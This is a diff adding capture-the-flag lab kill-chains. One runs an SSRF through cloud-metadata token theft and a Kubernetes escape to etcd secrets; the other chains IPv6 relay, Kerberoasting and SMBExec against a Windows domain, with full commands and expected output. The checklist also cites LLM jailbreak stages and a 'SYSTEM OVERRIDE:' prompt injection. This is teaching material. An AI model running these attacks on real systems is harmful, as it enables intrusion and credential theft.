@@ -2836,6 +2836,18 @@ The following checklist was applied before finalizing this document:
 | Phase 3: CC-02 Stage 1 includes `stat -fc %T /sys/fs/cgroup/` cgroup v1 verification before escape sequence | PASS |
 | Phase 3: CVE-03 kill-chain references Struts S2-045 (CVE-2017-5638), not Spring4Shell | PASS |
 | Phase 3: `grep -c "^### \[FLAG [12]\]" docs/KILL-CHAINS.md` returns 17 (10 Phase 2 + 7 Phase 3) | PASS |
+| Phase 4: Every LLM/ATP stage has all four fields: Action, Command, Expected Output, TTP | PASS |
+| Phase 4: All LLM kill-chain TTP fields reference OWASP LLM Top 10 2025 IDs (LLM01, LLM02, LLM03, LLM10) — not MITRE ATT&CK which has no LLM-specific entries | PASS |
+| Phase 4: LLM-01 has exactly 3 bypass stages (Persona Hijack, Base64 Encoding, Simulation Frame) + 1 `[FLAG 1]` stage — 4 stages total (per D-01..D-05) | PASS |
+| Phase 4: LLM-02 Stage 3 curl command uses `--data-binary @payload.txt` and targets `/ingest` endpoint (per D-06) | PASS |
+| Phase 4: LLM-02 injection instruction contains `SYSTEM OVERRIDE:` trigger text (per D-07) | PASS |
+| Phase 4: All 4 ATP scenarios have exactly 2 `[FLAG N]` headings each — Flag 1 at first lateral movement boundary, Flag 2 at second lateral movement boundary | PASS |
+| Phase 4: ATP-04 kill-chain contains no instance of "living-off-the-land" or "LotL" (per D-ATP04 Phase 2 decision) | PASS |
+| Phase 4: ATP-01 uses WinRM (first hop) + SMBExec (second hop) — two distinct protocols (per D-10, D-11) | PASS |
+| Phase 4: ATP-02 uses nginx curl\|bash supply chain (first hop) + dnscat2 DNS tunnel (second hop) — two distinct C2 mechanisms (per D-12, D-13) | PASS |
+| Phase 4: ATP-03 SSRF Stage 2 targets 169.254.169.254 and response includes `Token` field containing K8s service account JWT (per D-14) | PASS |
+| Phase 4: ATP-04 Stage 2 uses ntlmrelayx targeting `ldaps://` (not `ldap://`) to create domain account via LDAP relay | PASS |
+| Phase 4: `grep -c "^### \[FLAG [12]\]" docs/KILL-CHAINS.md` returns 28 (17 Phase 2-3 + 3 LLM×1 flag each + 4 ATP×2 flags each = 17+3+8 = 28) | PASS |
 
 ---
 
@@ -3587,3 +3599,430 @@ find / -name "flag2.txt" 2>/dev/null
 **Expected Output:** `CTF{...flag_value_placeholder...}`
 
 **TTP:** —
+
+---
+
+### ATP-03: LAPSUS$-Style SSRF-to-K8s Identity Chain
+
+**VMs:** Attacker (Kali), K8s App Host (Ubuntu 22.04, Flask SSRF app + IMDS mock + k3s cluster), Final Target (Ubuntu 22.04, internal service using etcd-stored admin credentials)
+**Difficulty:** Hard
+**Flags:** 2
+
+This scenario simulates the LAPSUS$ cloud identity attack pattern — the student exploits a web application SSRF vulnerability to reach the Kubernetes metadata service at 169.254.169.254, stealing a service account token, then uses the token to enumerate the cluster, escape to the host via a privileged pod, and query etcd for stored admin credentials to reach the final target. The IMDS endpoint reuses the CC-01 mock Flask topology with an additional `Token` field in the IAM credential response, reinforcing cloud metadata abuse concepts across the CC and ATP domains.
+
+---
+
+#### Stage 1: Web Application SSRF Discovery [AppHost]
+
+**Action:** You enumerate the Flask web application on the K8s app host to identify the SSRF-vulnerable endpoint that makes unvalidated server-side HTTP requests.
+
+**Command:**
+```bash
+nmap -sV -p 5000,8080,80,443 APP_HOST_IP
+
+# Confirm the Flask app is responding:
+curl -s http://APP_HOST_IP:5000/
+
+# Probe the SSRF endpoint — send the request back to itself to confirm reflection:
+curl -s "http://APP_HOST_IP:5000/fetch?url=http://127.0.0.1:5000/"
+```
+
+**Expected Output:** Flask app homepage returns HTML. The `/fetch?url=` endpoint fetches and returns the content of the target URL without validation, confirming an open SSRF vulnerability.
+
+**TTP:** [T1190 — Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/) · Initial Access
+
+---
+
+#### Stage 2: SSRF to IMDS — Cloud Service Account Token Theft [AppHost]
+
+**Action:** You exploit the SSRF endpoint to reach the simulated Kubernetes IMDS endpoint at 169.254.169.254, stealing the K8s service account token embedded in the IAM credential response (per D-14 — same CC-01 mock Flask topology with additional `Token` field).
+
+**Command:**
+```bash
+# Query the IMDS endpoint via SSRF (AWS IMDSv1-style path):
+curl -s "http://APP_HOST_IP:5000/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+
+# Retrieve the full credential JSON — includes Token field with K8s SA JWT:
+curl -s "http://APP_HOST_IP:5000/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/k8s-role"
+```
+
+**Expected Output:**
+```json
+{
+  "AccessKeyId": "AKIAIOSFODNN7EXAMPLE",
+  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
+  "Token": "eyJhbGciOiJSUzI1NiIsImtpZCI6IiJ9...",
+  "Expiration": "2099-01-01T00:00:00Z"
+}
+```
+The `Token` field contains the K8s service account JWT — extract it for the next stage.
+
+**TTP:** [T1552.005 — Cloud Instance Metadata API](https://attack.mitre.org/techniques/T1552/005/) · Credential Access
+
+---
+
+#### Stage 3: K8s Cluster Enumeration with Stolen Token [AppHost]
+
+**Action:** You configure kubectl with the stolen service account token and enumerate the Kubernetes cluster to identify pods, namespaces, and service account RBAC bindings.
+
+**Command:**
+```bash
+# Store the token extracted from the IMDS response:
+export K8S_TOKEN="eyJhbGciOiJSUzI1NiIsImtpZCI6IiJ9..."
+
+# List all pods across all namespaces:
+kubectl --token=$K8S_TOKEN --server=https://APP_HOST_IP:6443 \
+  --insecure-skip-tls-verify get pods -A
+
+# Enumerate ClusterRoleBindings to find over-privileged service accounts:
+kubectl --token=$K8S_TOKEN --server=https://APP_HOST_IP:6443 \
+  --insecure-skip-tls-verify get clusterrolebindings -o wide | grep -i admin
+```
+
+**Expected Output:** Pod listing showing a privileged pod (e.g., `debug-pod` in namespace `default`) with `privileged: true` in its securityContext. ClusterRoleBinding listing showing a service account with `cluster-admin` binding — the target for privilege escalation.
+
+**TTP:** [T1613 — Container and Resource Discovery](https://attack.mitre.org/techniques/T1613/) · Discovery
+
+---
+
+#### Stage 4: Privileged Pod Deployment — hostPath Mount [AppHost]
+
+**Action:** You create a privileged pod with a hostPath volume mount to `/` using the over-privileged service account, gaining access to the full host node filesystem from inside the container.
+
+**Command:**
+```bash
+# Write the privileged pod manifest:
+cat > escape-pod.yaml << 'EOF'
+apiVersion: v1
+kind: Pod
+metadata:
+  name: escape-pod
+  namespace: default
+spec:
+  serviceAccountName: OVERPRIVILEGED_SA
+  hostPID: true
+  containers:
+  - name: shell
+    image: ubuntu:22.04
+    command: ["/bin/bash", "-c", "sleep 3600"]
+    securityContext:
+      privileged: true
+    volumeMounts:
+    - mountPath: /host
+      name: host-root
+  volumes:
+  - name: host-root
+    hostPath:
+      path: /
+EOF
+
+# Apply the manifest using the stolen token:
+kubectl --token=$K8S_TOKEN --server=https://APP_HOST_IP:6443 \
+  --insecure-skip-tls-verify apply -f escape-pod.yaml
+
+# Wait for the pod to reach Running state, then exec in:
+kubectl --token=$K8S_TOKEN --server=https://APP_HOST_IP:6443 \
+  --insecure-skip-tls-verify exec -it escape-pod -- bash
+```
+
+**Expected Output:**
+```
+pod/escape-pod created
+root@escape-pod:/#
+```
+
+**TTP:** [T1611 — Escape to Host](https://attack.mitre.org/techniques/T1611/) · Privilege Escalation
+
+---
+
+### [FLAG 1] Stage 5: Flag Capture — Host Node Root Filesystem [AppHost]
+
+**Action:** You retrieve Flag 1 from the host node's root filesystem by chrooting into the hostPath mount, confirming full container escape and host-level access. This marks the first lateral movement boundary.
+
+**Command:**
+```bash
+# Inside the escape-pod shell — chroot into the mounted host filesystem:
+chroot /host /bin/bash
+
+# Retrieve Flag 1 from the host root:
+cat /root/flag1.txt
+```
+
+**Expected Output:** `CTF{...flag_value_placeholder...}`
+
+**TTP:** — (flag capture, not an adversarial technique)
+
+---
+
+#### Stage 6: etcd Discovery and Access — Cluster Secret Exfiltration [AppHost]
+
+**Action:** You locate and query the etcd cluster datastore from the host node (inside the chroot shell) to extract stored Kubernetes secrets, including the admin credentials for the final internal target.
+
+**Command:**
+```bash
+# Confirm etcd PKI certificates are present on the host:
+ls /etc/kubernetes/pki/etcd/
+
+# Enumerate all etcd keys using the prefix scan to locate secrets:
+ETCDCTL_API=3 etcdctl \
+  --endpoints=https://127.0.0.1:2379 \
+  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
+  --cert=/etc/kubernetes/pki/etcd/server.crt \
+  --key=/etc/kubernetes/pki/etcd/server.key \
+  get / --prefix --keys-only | grep -i secret
+
+# Retrieve the admin credential secret by key name:
+ETCDCTL_API=3 etcdctl \
+  --endpoints=https://127.0.0.1:2379 \
+  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
+  --cert=/etc/kubernetes/pki/etcd/server.crt \
+  --key=/etc/kubernetes/pki/etcd/server.key \
+  get /registry/secrets/default/ADMIN_SECRET_NAME | strings
+```
+
+**Expected Output:** etcd key listing showing secret names including `ADMIN_SECRET_NAME`. Secret value output containing base64-encoded admin credentials for the final internal target.
+
+**TTP:** [T1552.007 — Container API](https://attack.mitre.org/techniques/T1552/007/) · Credential Access
+
+---
+
+#### Stage 7: Credential Decoding and Final Target Authentication [FinalTarget]
+
+**Action:** You decode the base64-encoded credentials extracted from etcd and use them to authenticate to the final internal target service.
+
+**Command:**
+```bash
+# Decode the base64 credentials from etcd output:
+echo 'BASE64_CREDS' | base64 -d
+
+# Authenticate to the final target via SSH:
+ssh ADMIN_USER@FINAL_TARGET_IP
+
+# Alternative — HTTP basic auth if target exposes a web service:
+curl -s -u ADMIN_USER:DECODED_PASSWORD http://FINAL_TARGET_IP:PORT/admin
+```
+
+**Expected Output:** Successful SSH login (`ADMIN_USER@final-target:~$`) or HTTP 200 response from the final target's admin interface, confirming the etcd-stolen credentials are valid.
+
+**TTP:** [T1078 — Valid Accounts](https://attack.mitre.org/techniques/T1078/) · Defense Evasion
+
+---
+
+### [FLAG 2] Stage 8: Flag Capture — Final Target Admin Interface [FinalTarget]
+
+**Action:** You retrieve Flag 2 from the final internal target using the admin credentials extracted from etcd, completing the LAPSUS$-style cloud identity attack chain.
+
+**Command:**
+```bash
+# Retrieve Flag 2 on the final target:
+cat /root/flag2.txt
+
+# Alternative if target is a web service:
+curl -s -u ADMIN_USER:DECODED_PASSWORD http://FINAL_TARGET_IP:PORT/flag
+```
+
+**Expected Output:** `CTF{...flag_value_placeholder...}`
+
+**TTP:** — (flag capture, not an adversarial technique)
+
+---
+
+### ATP-04: Volt Typhoon-Style IPv6 Relay and Kerberoasting Chain
+
+**VMs:** Attacker (Kali), Pivot Host (Windows Server 2019, member server, corp.local), DC (Windows Server 2019, corp.local domain controller)
+**Difficulty:** Hard
+**Flags:** 2
+
+This scenario simulates the Volt Typhoon threat actor's technique of leveraging network protocol abuse — specifically IPv6 rogue DHCPv6 poisoning combined with LDAP relay — to create a privileged domain account with zero malware dropped on victim hosts. The student then uses the newly-created account to pivot via WinRM to the member server, performs Kerberoasting from the foothold to crack a service account hash, and completes the chain via a second lateral movement protocol (SMBExec or DCOM) to reach the Domain Controller.
+
+---
+
+#### Stage 1: IPv6 Rogue DHCPv6 Poisoning — mitm6 Setup [AttackerVM]
+
+**Action:** You deploy mitm6 to send spoofed DHCPv6 responses on the local network segment, assigning the attacker as the default IPv6 DNS server for domain-joined machines that respond to DHCPv6 solicitations.
+
+**Command:**
+```bash
+# Run mitm6 (requires root; targets corp.local domain):
+sudo mitm6 -d corp.local
+
+# mitm6 listens for DHCPv6 Solicit/Request messages and responds with:
+# - Attacker's IPv6 address as the DNS server for the domain
+# - Causes Windows hosts to send WPAD requests via IPv6 DNS to attacker
+```
+
+**Expected Output:**
+```
+Starting mitm6 using the following configuration:
+Primary adapter: eth0 [ATTACKER_MAC]
+IPv6 address: fe80::ATTACKER_IPV6
+Listening for queries from corp.local
+```
+
+**TTP:** [T1557.001 — Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001/) · Credential Access
+
+> **Note:** mitm6 maps to T1557.001 as the closest ATT&CK technique — the mechanism is DHCPv6 poisoning rather than LLMNR, but the adversary-in-the-middle credential interception pattern is identical. See NET-02 kill-chain for the same mapping rationale.
+
+---
+
+#### Stage 2: LDAP Relay — Privileged Domain Account Creation [AttackerVM]
+
+**Action:** You run ntlmrelayx targeting LDAP on the Domain Controller to relay NTLM authentication events captured via the mitm6 WPAD redirection, instructing it to create a new privileged domain account.
+
+**Command:**
+```bash
+# Run ntlmrelayx in a second terminal — LDAP relay targeting the DC:
+ntlmrelayx.py -6 -t ldaps://DC_IP \
+  --delegate-access \
+  --no-smb-server \
+  -wh ATTACKER_IP \
+  -wa corp_backdoor
+
+# When a domain machine connects via IPv6, ntlmrelayx relays credentials to LDAP
+# and creates a new computer account with delegation rights
+```
+
+**Expected Output:**
+```
+[*] HTTPD: Received connection from TARGET_IP, attacking target ldaps://DC_IP
+[*] Authenticating against ldaps://DC_IP as CORP/VICTIM_HOST$
+[*] Delegation rights modified successfully!
+[*] corp_backdoor$ created on the domain with the password: GENERATED_PASSWORD
+```
+
+**TTP:** [T1557.001 — Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001/) · Credential Access
+
+---
+
+#### Stage 3: WinRM Authentication — First Lateral Hop to Member Server [PivotHost]
+
+**Action:** You authenticate to the Windows member server via WinRM using the newly-created privileged domain account, establishing an interactive PowerShell session as the first lateral movement hop.
+
+**Command:**
+```bash
+evil-winrm -i PIVOT_HOST_IP -u 'corp_backdoor$' -p 'GENERATED_PASSWORD'
+
+# Confirm domain context inside the shell:
+whoami
+hostname
+```
+
+**Expected Output:**
+```
+Evil-WinRM shell v3.x
+*Evil-WinRM* PS C:\Users\corp_backdoor$\Documents>
+corp\corp_backdoor$
+PIVOT-SRV
+```
+
+**TTP:** [T1021.006 — Remote Services: Windows Remote Management](https://attack.mitre.org/techniques/T1021/006/) · Lateral Movement
+
+---
+
+### [FLAG 1] Stage 4: Flag Capture — Pivot Member Server [PivotHost]
+
+**Action:** You retrieve Flag 1 from the Windows member server, confirming successful WinRM lateral movement using the LDAP-relay-created domain account. This marks the first lateral movement boundary.
+
+**Command:**
+```bash
+# In the evil-winrm shell:
+type C:\Users\Administrator\Desktop\flag1.txt
+
+# Alternative if flag is not on the desktop:
+dir C:\ /s /b | findstr "flag1.txt"
+```
+
+**Expected Output:** `CTF{...flag_value_placeholder...}`
+
+**TTP:** — (flag capture, not an adversarial technique)
+
+---
+
+#### Stage 5: Kerberoasting from Foothold — Service Account Hash Harvest [PivotHost]
+
+**Action:** You perform Kerberoasting from the member server foothold to request TGS tickets for domain service accounts with registered SPNs, collecting hashes for offline cracking.
+
+**Command:**
+```bash
+# Upload Rubeus (pre-staged binary) from attacker VM to the foothold:
+upload /opt/Rubeus.exe
+
+# Run Kerberoasting — request TGS tickets for all SPNs:
+.\Rubeus.exe kerberoast /outfile:tgs.txt /simple
+
+# Pull the hash file back to the attacker for cracking:
+download tgs.txt
+```
+
+**Expected Output:**
+```
+[*] Total kerberoastable users : 2
+[*] Hash written to tgs.txt
+$krb5tgs$23$*svc_mssql$CORP.LOCAL$...
+```
+
+**TTP:** [T1558.003 — Steal or Forge Kerberos Tickets: Kerberoasting](https://attack.mitre.org/techniques/T1558/003/) · Credential Access
+
+---
+
+#### Stage 6: Offline Hash Cracking — Service Account Password Recovery [AttackerVM]
+
+**Action:** You crack the Kerberoasted service account hash offline with hashcat using the rockyou wordlist, recovering the plaintext password for use in the second lateral movement hop.
+
+**Command:**
+```bash
+# Crack the TGS hash offline on the attacker VM:
+hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt
+
+# Verify the cracked password:
+hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt --show
+```
+
+**Expected Output:**
+```
+$krb5tgs$23$*svc_mssql$CORP.LOCAL$...*:Service2024
+Session..........: hashcat
+Status...........: Cracked
+```
+
+**TTP:** [T1110.002 — Brute Force: Password Cracking](https://attack.mitre.org/techniques/T1110/002/) · Credential Access
+
+---
+
+#### Stage 7: SMBExec Lateral Movement to Domain Controller [DC]
+
+**Action:** You use the cracked service account credential to execute commands on the Domain Controller via SMBExec — a second distinct protocol from WinRM used in the first hop — completing the two-protocol ATP requirement.
+
+**Command:**
+```bash
+# Lateral movement to DC via SMBExec (second protocol — SMB, not WinRM):
+smbexec.py CORP.LOCAL/svc_mssql:CRACKED_PASSWORD@DC_IP
+
+# Alternative second protocol — DCOM/WMI exec if SMB signing blocks smbexec:
+wmiexec.py CORP.LOCAL/svc_mssql:CRACKED_PASSWORD@DC_IP
+```
+
+**Expected Output:**
+```
+Impacket v0.12.x - Copyright 2024 Fortra
+[!] Launching semi-interactive shell - Careful what you execute
+C:\Windows\system32>
+```
+
+**TTP:** [T1021.002 — Remote Services: SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002/) · Lateral Movement
+
+---
+
+### [FLAG 2] Stage 8: Flag Capture — Domain Controller [DC]
+
+**Action:** You retrieve Flag 2 from the Domain Controller filesystem via the SMBExec shell, completing the Volt Typhoon-style ATP chain with two distinct lateral movement protocols.
+
+**Command:**
+```bash
+# In the smbexec.py shell on the DC:
+type C:\Users\Administrator\Desktop\flag2.txt
+```
+
+**Expected Output:** `CTF{...flag_value_placeholder...}`
+
+**TTP:** — (flag capture, not an adversarial technique)
